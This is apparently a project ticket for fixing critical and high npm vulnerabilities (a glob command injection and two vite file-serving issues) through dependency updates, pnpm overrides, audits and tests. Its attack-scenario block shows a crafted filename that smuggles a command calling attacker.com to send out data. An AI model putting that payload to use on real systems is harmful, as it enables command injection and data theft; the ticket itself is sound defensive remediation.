# SECHARD-2001: Fix Critical/High npm Vulnerabilities

**Status:** Completed  
**Phase:** 2 (Execution)  
**Estimated Effort:** 45 minutes  
**Priority:** Critical  

---

## Summary

Fix critical and high severity npm vulnerabilities identified by `pnpm audit`, specifically command injection in glob and middleware issues in vite.

---

## Background

**Current State:**
`pnpm audit` reports 5 critical/high vulnerabilities:
- **3 Critical** - glob command injection (CVE-2025-64756)
- **2 High** - vite middleware/filesystem issues

**Impact:**
- **glob vulnerability:** Arbitrary command execution in CI/CD pipelines, developer workstations
- **vite vulnerability:** File serving bypass, potential information disclosure

**Affected Packages:**
```
Critical:
- glob@10.4.5 (via packages__cli>tsup>sucrase>glob)

High:
- vite@≤5.4.19 (via vitest>vite) - 2 issues
```

---

## Acceptance Criteria

1. ✅ All critical vulnerabilities resolved
2. ✅ All high vulnerabilities resolved
3. ✅ `pnpm audit --prod` shows 0 critical/high issues
4. ✅ All builds pass (`pnpm build`)
5. ✅ All tests pass (`pnpm test`)
6. ✅ No breaking changes introduced

---

## Technical Requirements

### Vulnerability 1: glob - Command Injection (CRITICAL)

**CVE:** CVE-2025-64756  
**GHSA:** GHSA-5j98-mcp5-4vw2  
**Severity:** Critical (CVSS 9.8)

**Description:**
The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names.

**Attack Scenario:**
```bash
# Malicious filename
touch '$(curl attacker.com/exfil?data=$(whoami))'

# Vulnerable command
glob -c echo "**/*"
# Result: Command in filename executes with user privileges
```

**Vulnerable Versions:** ≤10.4.5  
**Patched Versions:** ≥10.5.0, ≥11.1.0

**Path:** `packages__cli>tsup>sucrase>glob`

**Remediation:**
1. Update glob to latest version
2. Check if tsup/sucrase can be updated to pull in newer glob
3. If transitive, use pnpm overrides:
   ```json
   {
     "pnpm": {
       "overrides": {
         "glob": "^11.1.0"
       }
     }
   }
   ```

### Vulnerability 2: vite - Middleware Issues (HIGH × 2)

**GHSA-1:** GHSA-g4jq-h2w9-997c  
**GHSA-2:** GHSA-jqfw-vq24-v9c3  
**Severity:** High

**Issue 1:** Middleware may serve files with same name prefix  
**Issue 2:** `server.fs` settings not applied to HTML files

**Vulnerable Versions:** ≤5.4.19  
**Patched Versions:** ≥5.4.20

**Path:** `vitest>vite`

**Remediation:**
1. Update vitest to version that includes vite ≥5.4.20
2. Verify dev server security settings if using vite in development

---

## Implementation Steps

### Step 1: Analyze Dependency Tree

```bash
# Find exact dependency paths
pnpm why glob
pnpm why vite

# Check current versions
pnpm list glob
pnpm list vite
```

### Step 2: Update Dependencies

**Option A: Direct updates (if possible)**
```bash
# Update vitest (will update vite)
pnpm update vitest -r --latest

# Check if glob is dev dependency
pnpm update glob -D
```

**Option B: Use overrides (if transitive)**
```json
// package.json (root)
{
  "pnpm": {
    "overrides": {
      "glob": "^11.1.0",
      "vite": "^5.4.20"
    }
  }
}
```

Then run:
```bash
pnpm install
```

### Step 3: Verify Fixes

```bash
# Re-run audit
pnpm audit

# Check for critical/high
pnpm audit --audit-level=high

# Verify builds
pnpm build

# Run tests
pnpm test
```

### Step 4: Test Affected Packages

**For glob fix:**
- Test CLI packages that use tsup
- Verify build scripts work

**For vite fix:**
- Run vitest tests
- Verify dev server works (if applicable)

---

## Verification Steps

1. **Pre-update Audit:**
   ```bash
   pnpm audit > audit-before.txt
   ```

2. **Apply Updates:**
   - Update dependencies as outlined
   - Run `pnpm install`

3. **Post-update Audit:**
   ```bash
   pnpm audit > audit-after.txt
   diff audit-before.txt audit-after.txt
   ```

4. **Build Verification:**
   ```bash
   pnpm build
   # Should complete without errors
   ```

5. **Test Verification:**
   ```bash
   pnpm test
   # All tests should pass
   ```

6. **Manual Testing:**
   - Test CLI commands
   - Verify dev server (if used)
   - Check any glob-dependent scripts

---

## Files to Modify

1. **Root `package.json`** (if using overrides)
   - Add pnpm.overrides section

2. **Workspace `package.json`** files (if direct updates)
   - Update vitest version
   - Update any direct glob dependencies

3. **`pnpm-lock.yaml`**
   - Will be auto-updated by pnpm install

---

## Rollback Plan

If updates break builds/tests:

```bash
# Restore previous lock file
git checkout pnpm-lock.yaml package.json

# Reinstall
pnpm install

# Document issue
# Create temporary workaround or accepted risk doc
```

---

## Known Issues & Edge Cases

1. **Breaking Changes:**
   - glob 11.x may have API changes from 10.x
   - Check glob changelog: https://github.com/isaacs/node-glob/releases

2. **Transitive Dependencies:**
   - tsup/sucrase may need updates too
   - May need to wait for upstream releases

3. **Override Conflicts:**
   - Overrides affect ALL instances globally
   - Test thoroughly to avoid breaking other packages

---

## Definition of Done

- [ ] `pnpm audit --audit-level=high` reports 0 critical/high vulnerabilities
- [ ] All workspace builds succeed
- [ ] All tests pass
- [ ] No new errors or warnings introduced
- [ ] Changes committed with clear message
- [ ] Ticket marked as Complete

---

## Resources

- **glob Advisory:** https://github.com/advisories/GHSA-5j98-mcp5-4vw2
- **vite Advisory 1:** https://github.com/advisories/GHSA-g4jq-h2w9-997c
- **vite Advisory 2:** https://github.com/advisories/GHSA-jqfw-vq24-v9c3
- **pnpm Overrides:** https://pnpm.io/package_json#pnpmoverrides

---

## Notes

**Priority Justification:**
Command injection vulnerabilities are critical because they allow arbitrary code execution. This is especially dangerous in:
- CI/CD pipelines (access to secrets, deployment credentials)
- Developer machines (SSH keys, tokens, source code)
- Automated build systems

**Urgency:** Should be fixed in same session as discovery. Do not merge PRs or release until resolved.
